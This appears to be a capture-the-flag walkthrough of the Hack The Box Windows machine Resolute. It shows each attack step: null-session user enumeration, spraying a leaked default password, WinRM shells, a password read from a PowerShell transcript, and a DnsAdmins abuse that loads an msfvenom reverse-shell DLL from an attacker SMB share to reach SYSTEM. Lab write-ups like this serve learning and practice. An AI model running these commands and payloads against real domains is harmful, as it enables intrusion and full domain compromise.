# ENUMERATION

## NMAP

```bash
nmap -p- --min-rate=10000 -sVC -oN nmap -v 10.10.10.169

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-02 15:17:11Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49731/tcp open  tcpwrapped
49779/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submi
```

## SMB

Adding domains to host file

```bash
nxc smb 10.10.10.169 -u '' -p '' --generate-hosts-file /etc/passwd
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\:
```

### NULL SESSION

```bash
nxc smb 10.10.10.169 -u '' -p ''                                  
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\:
```

We can authenticate using null session

### Extracting users from null sessions

```bash
nxc smb 10.10.10.169 -u '' -p '' --users-export users 
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
SMB         10.10.10.169    445    RESOLUTE         -Username-                    -Last PW Set-       -BadPW- -Description-                                                               
SMB         10.10.10.169    445    RESOLUTE         Administrator                 2025-08-07 14:40:02 0       Built-in account for administering the computer/domain                      
SMB         10.10.10.169    445    RESOLUTE         Guest                         <never>             0       Built-in account for guest access to the computer/domain                    
SMB         10.10.10.169    445    RESOLUTE         krbtgt                        2019-09-25 13:29:12 0       Key Distribution Center Service Account                                     
SMB         10.10.10.169    445    RESOLUTE         DefaultAccount                <never>             0       A user account managed by the system.                                       
SMB         10.10.10.169    445    RESOLUTE         ryan                          2025-08-07 14:40:01 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123!                                
SMB         10.10.10.169    445    RESOLUTE         sunita                        2019-12-03 21:26:29 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         abigail                       2019-12-03 21:27:30 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         marcus                        2019-12-03 21:27:59 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         sally                         2019-12-03 21:28:29 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         fred                          2019-12-03 21:29:01 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         angela                        2019-12-03 21:29:43 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         felicia                       2019-12-03 21:30:53 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         gustavo                       2019-12-03 21:31:42 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         ulf                           2019-12-03 21:32:19 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         stevie                        2019-12-03 21:33:13 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         claire                        2019-12-03 21:33:44 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         paulo                         2019-12-03 21:34:46 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         steve                         2019-12-03 21:35:25 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         annette                       2019-12-03 21:36:55 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         annika                        2019-12-03 21:37:23 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         per                           2019-12-03 21:38:12 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         claude                        2019-12-03 21:39:56 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         melanie                       2025-08-07 14:40:02 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         zach                          2019-12-04 10:39:27 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         simon                         2019-12-04 10:39:58 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         naoki                         2019-12-04 10:40:44 0                                                                                   
SMB         10.10.10.169    445    RESOLUTE         [*] Enumerated 27 local users: MEGABANK
SMB         10.10.10.169    445    RESOLUTE         [*] Writing 27 local users to users

```

In the description field of the user marko we can see it says ‘Account created. Password set to Welcome123!’ , we can assume this is a default password and this is set when the account is created.

# Exploitation

## Password spraying

```bash
nxc smb 10.10.10.169 -u users -p 'Welcome123!'           
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

We can see user melanie didn’t changed her password.

## Shell as melanie

Checking for winrm.

```bash
nxc winrm 10.10.10.169 -u melanie -p 'Welcome123!'
WINRM       10.10.10.169    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)    
```

```bash
evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

## USER FLAG

```bash

PS C:\Users\melanie> tree /f /a
Folder PATH listing
Volume serial number is 000000B5 D1AC:5AF6
C:.
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

Now after this i tried a lot of thing for escalating privileages, like running linpeas looking for hidden files.

While finding the hidden files i found the powershell history file

```bash
PS C:\> ls -force 

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         8/7/2025   7:34 AM      402653184 pagefile.sys

```

the  `ls -force` shows all the files including the hidden ones

among this the POSTranscripts looks intresting

```bash
PS C:\PSTranscripts> ls -force 

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

```

now in the script we can see the password of the user ryan

```bash
mmand start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

## Shell as ryan

```bash
 evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

```bash
PS C:\Users\ryan> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group

```

We can see that the user ryan is a part of the dns admins group

DNSAdmins exploitation is an attack that allows members of the DNSAdmins group to take over control of a Domain Controller running the Microsoft DNS service. A member of the DNSAdmins group has rights to perform administrative tasks on the Active Directory DNS service. Attackers can abuse these rights to execute malicious code in a highly privileged context.

## Abusing dns admins privileages

We can now easily get a reverse shell by placing a DLL reverse shell file, modifying the DNSAdmins configuration to use that file, and then restarting the service.

### Generating dll with msfvenom

```bash
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.28 LPORT=9001 -f dll > reverse.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

### Chaning the dns config

```bash
PS C:\Users\ryan> dnscmd.exe /config /serverlevelplugindll '//10.10.16.10/share/reverse.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

### Starting a smbserver

```bash
impacket-smbserver share . -smb2support 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

### Restarting dns services

```bash
PS C:\Users\ryan> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2268
        FLAGS              :
```

## SHELL AS ADMINISTRATOR

and we got our shell.

```bash
nc -lnvp 9001 
listening on [any] 9001 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.10.169] 50910
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
Resolute

C:\Windows\system32>

```
